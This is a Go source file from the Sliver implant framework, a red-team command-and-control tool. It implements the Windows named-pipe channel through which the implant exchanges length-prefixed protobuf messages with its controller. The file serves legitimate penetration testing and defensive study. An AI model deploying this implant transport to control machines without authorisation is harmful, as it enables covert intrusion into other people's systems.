//go:build windows

package namedpipe

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"bytes"
	"encoding/binary"
	"io"
	"log"
	"net"

	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

// SetupConnectionNamedPipe - Wraps a Named Pipe connection into a logical Connection stream.
// The generic SetupConnectionStream is not used, due to Read and Write functions being slightly different.
func SetupConnectionNamedPipe(conn net.Conn, userCleanup func()) (*transports.Connection, error) {

	connection := transports.NewConnection()

	go func() {
		defer connection.Cleanup()
		for envelope := range connection.Send {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			writeEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := readEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				connection.Recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()

	return connection, nil
}

func writeEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("[namedpipe] Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error %s and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeNamedPipe {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %s\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %s", err)
			// {{end}}
		}
	}
	return nil
}

func readEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error (read msg-length): %s", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSizeNamedPipe)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Unmarshal envelope error: %s", err)
		// {{end}}
		return &sliverpb.Envelope{}, err
	}
	return envelope, nil
}

// {{end}} -NamePipec2Enabled
